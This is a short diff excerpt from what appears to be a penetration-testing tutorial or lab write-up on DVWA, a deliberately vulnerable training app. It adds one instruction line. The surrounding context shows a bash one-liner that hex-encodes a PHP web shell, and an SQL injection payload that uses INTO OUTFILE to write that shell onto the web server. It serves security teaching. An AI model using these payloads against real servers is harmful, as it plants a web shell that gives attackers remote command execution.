@@ -216,12 +216,14 @@ Can't create/write to file '/var/www/shell.php' (Errcode: 13 "Permission denied"
 
 `<insert_screenshosts>`
 
-- You can of course encode it with hexadecimal
+- You can of course encode it with hexadecimal.
 
 ```bash
 $ echo -n "<?php system(\$_GET['cmd']); ?>" | hexdump -v -e '/1 "%02x"' | sed 's/^/0x/'
 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e
 ```
+
+- Then combine it with SQL injection.
 
 ```sql
 ' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e, NULL INTO OUTFILE '/var/www/html/dvwa/shell.php'#
